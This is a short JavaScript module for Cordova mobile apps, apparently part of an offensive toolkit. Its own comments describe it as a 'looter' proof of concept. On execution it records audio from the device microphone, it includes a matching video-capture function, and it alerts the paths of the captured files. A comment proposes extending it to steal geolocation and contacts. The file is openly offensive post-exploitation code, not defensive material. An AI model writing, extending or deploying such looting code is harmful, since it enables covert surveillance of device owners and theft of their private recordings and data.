"use strict";

/*
 * Right now this module just loots audio data but could be expanded in order
 * to catpure all sorts of interesting data (e.g. geo-location, contacts, etc)
 */
define(['utils'], function(utils) {

    console.log('Setup Module: Cordova ');

    return {

        utils: utils,

        // Main entry point for all looters
        // Capture video content for now as a PoC
        execute: function() {
            this.captureAudio();
        },

        captureAudio: function(limit, duration) {
            var options = { 
                limit: limit === undefined ? 1 : limit,
                duration: duration === undefined ? 10 : duration
            };
            navigator.device.capture.captureAudio(this.captureSuccess, this.captureError, options);
        },

        captureVideo: function(limit, duration) {
            var options = { 
                limit: limit === undefined ? 1 : limit,
                duration: duration === undefined ? 10 : duration
            };
            navigator.device.capture.captureVideo(this.captureSuccess, this.captureError, options);
        },

        captureError: function(error) {
            console.log('An error occurred during capture: ' + error.code);
        },

        captureSuccess: function(media) {
            console.log(media);
            
            var i, path, len;
            for (i = 0, len = media.length; i < len; i += 1) {
                path = media[i].fullPath;
                alert(path);
            }
        }

    }

});